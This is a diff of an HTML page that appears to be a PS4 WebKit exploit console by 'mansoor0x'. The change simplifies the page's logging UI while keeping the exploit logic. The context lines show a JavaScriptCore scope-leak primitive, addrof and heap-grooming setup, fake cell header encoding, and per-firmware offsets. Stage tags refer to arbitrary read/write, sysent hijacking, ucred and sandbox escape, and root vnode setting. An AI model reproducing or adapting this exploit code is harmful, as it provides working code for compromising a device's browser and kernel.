@@ -1,318 +1,47 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="referrer" content="no-referrer">
-<title>PS4 WebKit Exploit Console — mansoor0x</title>
+<title>WebKit Exploit</title>
 <style>
-* { box-sizing: border-box; }
-html, body {
-    margin: 0; padding: 0;
-    background: #0a0e14;
-    color: #c9d1d9;
-    font: 12px/1.5 ui-monospace, 'Cascadia Mono', 'Consolas', 'Menlo', 'Courier New', monospace;
-    -webkit-text-size-adjust: 100%;
+body {
+    background: #ffffff;
+    color: #000000;
+    font: 13px 'Courier New', monospace;
+    margin: 20px;
+    padding: 0;
 }
-#app { padding: 10px; }
-#header {
-    border-bottom: 1px solid #21262d;
-    padding-bottom: 8px;
-    margin-bottom: 10px;
-    display: -webkit-box;
-    display: -webkit-flex;
-    display: flex;
-    -webkit-justify-content: space-between;
-    justify-content: space-between;
-    -webkit-align-items: center;
-    align-items: center;
-    -webkit-flex-wrap: wrap;
-    flex-wrap: wrap;
-    gap: 8px;
+#out {
+    white-space: pre-wrap;
+    word-wrap: break-word;
+    max-width: 900px;
 }
-#header .title {
-    color: #58a6ff;
+.highlight {
+    color: #cc0000;
     font-weight: bold;
-    font-size: 13px;
-    letter-spacing: 0.5px;
 }
-#header .meta { color: #8b949e; font-size: 11px; }
-#header .meta span { margin-left: 10px; }
-#header .meta b { color: #c9d1d9; font-weight: normal; }
-#stages {
-    display: -webkit-box;
-    display: -webkit-flex;
-    display: flex;
-    -webkit-flex-wrap: wrap;
-    flex-wrap: wrap;
-    gap: 4px;
-    margin-bottom: 10px;
-}
-.stage {
-    padding: 3px 8px;
-    border-radius: 3px;
-    font-size: 11px;
-    border: 1px solid #30363d;
-    background: #161b22;
-    color: #6e7681;
-    white-space: nowrap;
-}
-.stage.pass { background: #0d3a1d; border-color: #238636; color: #3fb950; }
-.stage.fail { background: #3d1214; border-color: #da3633; color: #f85149; }
-.stage.run  { background: #3d2e0d; border-color: #d29922; color: #e3b341; }
-.stage.info { background: #13253d; border-color: #1f6feb; color: #58a6ff; }
-.stage.pending { opacity: 0.5; }
-#log {
-    background: #010409;
-    border: 1px solid #21262d;
-    border-radius: 4px;
-    padding: 8px;
-    height: 70vh;
-    overflow-y: auto;
-    font-size: 11px;
-    line-height: 1.55;
-}
-.log-line { white-space: pre-wrap; word-break: break-all; }
-.log-line .seq { color: #484f58; }
-.log-line .tag { color: #c9d1d9; }
-.log-line .extra { color: #8b949e; }
-.log-line.pass .tag { color: #3fb950; font-weight: bold; }
-.log-line.fail .tag { color: #f85149; font-weight: bold; }
-.log-line.run  .tag { color: #e3b341; }
-.log-line.info .tag { color: #58a6ff; }
-.log-line.wait .tag { color: #d29922; }
-.status-badge {
-    display: inline-block;
-    min-width: 34px;
-    padding: 0 4px;
-    border-radius: 2px;
-    text-align: center;
-    font-weight: bold;
-    font-size: 10px;
-    margin-right: 6px;
-    vertical-align: 1px;
-}
-.status-badge.pass { background: #238636; color: #fff; }
-.status-badge.fail { background: #da3633; color: #fff; }
-.status-badge.run  { background: #d29922; color: #000; }
-.status-badge.info { background: #1f6feb; color: #fff; }
-.status-badge.wait { background: #d29922; color: #000; }
 </style>
 </head>
 <body>
-<div id="app">
-    <div id="header">
-        <div class="title">PS4 WEBKIT EXPLOIT CONSOLE</div>
-        <div class="meta">
-            <span>FW <b id="m-fw">&mdash;</b></span>
-            <span>REV <b id="m-rev">&mdash;</b></span>
-            <span>ATT <b id="m-att">&mdash;</b></span>
-        </div>
-    </div>
-    <div id="stages"></div>
-    <div id="log"></div>
-</div>
+<pre id="out"></pre>
+
 <script>
 "use strict";
 
-// ========== SHARED CONFIG ==========
-var Q = new URLSearchParams(location.search);
-
-var REVISION = "genuine-u8-rw-3-1352";
+// ========== HEADER MESSAGE ==========
 var headerMsg = "mansoor0x";
-
-var MAX_ATTEMPTS = (function(){
-    var v = parseInt(Q.get("r") || "1", 10);
-    if (!isFinite(v)) v = 1;
-    return Math.max(1, Math.min(10, v));
-})();
-
-var DRAIN_COUNT = (function(){
-    var v = parseInt(Q.get("n") || "64", 10);
-    if (!isFinite(v)) v = 64;
-    return Math.max(32, Math.min(512, v));
-})();
-
-var CARRIER_SLOTS = (function(){
-    var v = parseInt(Q.get("c") || "2000000", 10);
-    if (!isFinite(v)) v = 2000000;
-    return Math.max(100000, Math.min(4000000, v));
-})();
-var CARRIER_BYTES = CARRIER_SLOTS * 8;
-
-// ========== UI ==========
-var STAGES = ["BOOT","SSV","ADDROF","GROOM","TRIGGER","RW","KEXPLOIT","SANDBOX","ROOT","COMPLETE"];
-var STAGE_STATUS = {};
-for (var _si = 0; _si < STAGES.length; _si++) STAGE_STATUS[STAGES[_si]] = "pending";
-var LOG_MAX = 400;
-var uiSeq = 0;
-var headerPrinted = false;
 var headerBorder = "=".repeat(50);
-
-var TAG_MAP = {
-    "BOOT":               ["BOOT", "info"],
-    "ATTEMPT":            ["BOOT", "run"],
-    "SETUP-THREW":        ["BOOT", "fail"],
-    "SSV-BUILD":          ["SSV", "run"],
-    "SSV-BUILT":          ["SSV", "pass"],
-    "SSV-STORE-ENTER":    ["SSV", "run"],
-    "SSV-STORED":         ["SSV", "pass"],
-    "ADDROF-PREP-BEGIN":  ["ADDROF", "run"],
-    "ADDROF-CARRIER-DONE":["ADDROF", "info"],
-    "ADDROF-WRAPPER-READY":["ADDROF", "info"],
-    "ADDROF-RETURNED":    ["ADDROF", "pass"],
-    "ADDROF-COPY":        ["ADDROF", "info"],
-    "ADDROF-POINTERS":    ["ADDROF", "info"],
-    "ADDROF-FAIL":        ["ADDROF", "fail"],
-    "ADDROF-NO-RESULT":   ["ADDROF", "fail"],
-    "ADDROF-THREW":       ["ADDROF", "fail"],
-    "SSV-GROOM-ENTER":    ["GROOM", "run"],
-    "PREDECESSOR-FILLED": ["GROOM", "pass"],
-    "SSV-RETURNED-CLEARED":["TRIGGER", "pass"],
-    "RW-CARRIER":         ["TRIGGER", "info"],
-    "TARGET-CELL":        ["TRIGGER", "info"],
-    "FAKE-RETAINED":      ["TRIGGER", "info"],
-    "RW-HEADER-HEX":      ["TRIGGER", "info"],
-    "TARGET-HEADER-HEX":  ["TRIGGER", "info"],
-    "HEADER-MISMATCH":    ["TRIGGER", "fail"],
-    "NORMAL-CLONE-MISS":  ["TRIGGER", "fail"],
-    "LOAD-THREW":         ["TRIGGER", "fail"],
-    "SSV-PLACEMENT-MISS": ["TRIGGER", "fail"],
-    "NO-RESULT":          ["TRIGGER", "fail"],
-    "DONE-THROW":         ["TRIGGER", "info"],
-    "DONE-MISS":          ["TRIGGER", "info"],
-    "ARBITRARY-READ-PASS":["RW", "pass"],
-    "ARBITRARY-READ-MISMATCH":["RW", "fail"],
-    "ARBITRARY-WRITE-PASS":["RW", "pass"],
-    "ARBITRARY-WRITE-MISMATCH":["RW", "fail"],
-    "GENUINE-UB-RW-PASS": ["RW", "pass"],
-    "ROOTS-LIVE":         ["RW", "info"],
-    "SURVIVED-T100":      ["RW", "info"],
-    "SURVIVED-T1000":     ["RW", "info"],
-    "SURVIVED-T3000":     ["RW", "info"],
-    "SURVIVED-THROW-T1000":["RW", "info"],
-    "SURVIVED-MISS-T1000":["RW", "info"],
-    "SURVIVED-MISMATCH-T1000":["RW", "info"],
-    "===== PS4 JAILBREAK START =====":["KEXPLOIT", "run"],
-    "KERNEL-BASE":        ["KEXPLOIT", "info"],
-    "SYSENT-661":         ["KEXPLOIT", "info"],
-    "JMP-RSI":            ["KEXPLOIT", "info"],
-    "SYSENT-HIJACKED":    ["KEXPLOIT", "pass"],
-    "JAILBREAK-ERROR":    ["KEXPLOIT", "fail"],
-    "SCAN-HIT":           ["SANDBOX", "info"],
-    "UCRED-SIG-CANDIDATE":["SANDBOX", "info"],
-    "UCRED-SIG-FOUND":    ["SANDBOX", "info"],
-    "VERIFY-UID":         ["SANDBOX", "pass"],
-    "PROC-DUMP":          ["SANDBOX", "info"],
-    "VERIFY-ROOTVNODE":   ["ROOT", "info"],
-    "SYSENT-RESTORED":    ["COMPLETE", "pass"],
-    "===== JAILBREAK COMPLETE =====":["COMPLETE", "pass"],
-    "RETRY":              ["BOOT", "wait"],
-    "GIVE-UP":            ["BOOT", "fail"],
-    "ADVICE":             ["BOOT", "info"]
-};
-
-function classify(tag, extra) {
-    if (tag === "SANDBOX-ESCAPE") {
-        var ok = String(extra || "").indexOf("success") === 0;
-        return ["SANDBOX", ok ? "pass" : "fail"];
-    }
-    if (tag === "ROOT-VNODE-SET") {
-        var ok2 = String(extra || "").indexOf("success") === 0;
-        return ["ROOT", ok2 ? "pass" : "fail"];
-    }
-    var m = TAG_MAP[tag];
-    if (m) return m;
-    return ["MISC", "info"];
-}
-
-function renderStages() {
-    var el = document.getElementById("stages");
-    if (!el) return;
-    var html = "";
-    for (var i = 0; i < STAGES.length; i++) {
-        var s = STAGES[i];
-        var st = STAGE_STATUS[s];
-        html += '<span class="stage ' + st + '">' + s + '</span>';
-    }
-    el.innerHTML = html;
-}
-
-function updateMeta() {
-    var el = document.getElementById("m-fw");
-    if (el) el.textContent = (typeof FW_LABEL !== "undefined" && FW_LABEL) ? FW_LABEL : "\u2014";
-    var el2 = document.getElementById("m-rev");
-    if (el2) el2.textContent = REVISION;
-    var el3 = document.getElementById("m-att");
-    if (el3) el3.textContent = (typeof attemptNumber !== "undefined" ? attemptNumber : 0) + "/" + MAX_ATTEMPTS;
-}
-
-function addLogLine(status, stage, tag, extra) {
-    var log = document.getElementById("log");
-    if (!log) return;
-    uiSeq++;
-
-    if (stage && STAGE_STATUS[stage] !== undefined) {
-        var cur = STAGE_STATUS[stage];
-        var order = { pending: 0, info: 1, run: 2, pass: 3, fail: 4 };
-        if (cur === "fail") {
-            // keep
-        } else if (cur === "pass" && (status === "info" || status === "run")) {
-            // keep
-        } else if (order[status] >= order[cur]) {
-            STAGE_STATUS[stage] = status;
-            renderStages();
-        }
-    }
-
-    var line = document.createElement("div");
-    line.className = "log-line " + status;
-
-    var seqSpan = document.createElement("span");
-    seqSpan.className = "seq";
-    var n = uiSeq.toString();
-    while (n.length < 4) n = "0" + n;
-    seqSpan.textContent = "[" + n + "] ";
-    line.appendChild(seqSpan);
-
-    var badge = document.createElement("span");
-    badge.className = "status-badge " + status;
-    badge.textContent = status === "pass" ? "PASS"
-                      : status === "fail" ? "FAIL"
-                      : status === "run"  ? "RUN "
-                      : status === "wait" ? "WAIT"
-                      : "INFO";
-    line.appendChild(badge);
-
-    var tagSpan = document.createElement("span");
-    tagSpan.className = "tag";
-    tagSpan.textContent = tag;
-    line.appendChild(tagSpan);
-
-    if (extra !== undefined && extra !== null && String(extra) !== "") {
-        var extraSpan = document.createElement("span");
-        extraSpan.className = "extra";
-        extraSpan.textContent = "  " + String(extra);
-        line.appendChild(extraSpan);
-    }
-
-    log.appendChild(line);
-    while (log.childNodes.length > LOG_MAX) {
-        log.removeChild(log.firstChild);
-    }
-    log.scrollTop = log.scrollHeight;
-}
+var headerPrinted = false;
 
 function printHeader() {
     if (headerPrinted) return;
     headerPrinted = true;
-    addLogLine("info", "BOOT", "SYSTEM", "==== " + headerMsg + " | rev " + REVISION + " ====");
-}
-
-function mark(tag, extra) {
-    if (!headerPrinted) printHeader();
-    var cls = classify(tag, extra);
-    addLogLine(cls[1], cls[0], tag, extra);
+    try {
+        var el = document.getElementById("out");
+        el.textContent += headerBorder + "\n";
+        el.textContent += " " + headerMsg + "\n";
+        el.textContent += headerBorder + "\n";
+    } catch (_) {}
 }
 
 // ========== PS4 OFFSETS ==========
@@ -349,8 +78,13 @@ var PS4_OFFSETS = {
 };
 
 // ========== PARAMETERS ==========
+var Q = new URLSearchParams(location.search);
+var requestedDrain = parseInt(Q.get("n") || "128", 10);
+var DRAIN_COUNT = isFinite(requestedDrain) ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
 var LITE = Q.get("l") === "1";
 
+var REVISION = "genuine-u8-rw-3-1352";
+var MAX_ATTEMPTS = 10;
 var attemptNumber = 0;
 var K = 2;
 var DUPLICATE_INDEX = 2;
@@ -361,6 +95,8 @@ var FILLER_OBJECTS = 0xfffe - K;
 var EXPECTED_LENGTH = 0x50001;
 var CELL_BYTES = 0x30;
 
+var CARRIER_SLOTS = 4500000;
+var CARRIER_BYTES = CARRIER_SLOTS * 8;
 var CAPTURE_DELAY_MS = 3000;
 var COMPOSE_DELAY_MS = 6500;
 var symbolToString = Symbol.prototype.toString;
@@ -442,18 +178,44 @@ var FW_LABEL = (function() {
 var fwOffsets = PS4_OFFSETS[FW_LABEL] || PS4_OFFSETS[""];
 
 // ========== UTILITY ==========
-function hex(value) { return "0x" + value.toString(16); }
-function buffer(size) { return new ArrayBuffer(size); }
+function mark(tag, extra) {
+    if (!headerPrinted) printHeader();
+    seq++;
+    var line = seq + "-rw-" + tag + (extra !== undefined ? "-" + extra : "");
+    try {
+        var el = document.getElementById("out");
+        if (tag === "GENUINE-UB-RW-PASS" || tag === "===== JAILBREAK COMPLETE =====") {
+            var span = document.createElement("span");
+            span.className = "highlight";
+            span.textContent = line + "\n";
+            el.appendChild(span);
+        } else {
+            el.textContent += line + "\n";
+        }
+    } catch (_) {}
+}
+
+function hex(value) {
+    return "0x" + value.toString(16);
+}
+
+function buffer(size) {
+    return new ArrayBuffer(size);
+}
+
 function uint32At(bytes, offset) {
     return bytes[offset] + bytes[offset+1]*0x100 + bytes[offset+2]*0x10000 + bytes[offset+3]*0x1000000;
 }
+
 function plausibleCell(value) {
     return value > 0x100000000 && value <= 0xffffffffffff && value <= 9007199254740991 && Math.floor(value) === value && value % 8 === 0;
 }
+
 function pointerFromWords(words, offset) {
     if (words[offset+3] !== 0) return NaN;
     return words[offset] + words[offset+1]*0x10000 + words[offset+2]*0x100000000;
 }
+
 function encodedHeaderNumber() {
     var raw = new ArrayBuffer(8);
     var u32 = new Uint32Array(raw);
@@ -462,6 +224,7 @@ function encodedHeaderNumber() {
     u32[1] = 0x01062800;
     return f64[0];
 }
+
 function leakScopeObject() {
     class Leaker { leak() { return super.foo; } }
     Leaker.prototype.__proto__ = new Proxy({}, {
@@ -470,6 +233,7 @@ function leakScopeObject() {
     var leak = Leaker.prototype.leak;
     return (function() { return leak(); })();
 }
+
 function prepareSymbolWrapper(F) {
     leakedScope = leakScopeObject();
     if (leakedScope === undefined || leakedScope === null) throw new Error("scope-not-leaked");
@@ -1102,7 +866,6 @@ function scheduleRetry(reason) {
 function runAttempt() {
     attemptNumber++;
     if (attemptNumber > 1) cleanupForRetry();
-    updateMeta();
     mark("ATTEMPT", attemptNumber + "-of-" + MAX_ATTEMPTS + "-n=" + DRAIN_COUNT);
     try {
         buildAndStoreGraph();
@@ -1114,14 +877,8 @@ function runAttempt() {
 }
 
 // ========== INIT ==========
-updateMeta();
-renderStages();
-mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-c=" + CARRIER_SLOTS + "-r=" + MAX_ATTEMPTS);
-try {
-    runAttempt();
-} catch (error) {
-    mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
-}
+mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-attempts=" + MAX_ATTEMPTS);
+runAttempt();
 </script>
 </body>
 </html>
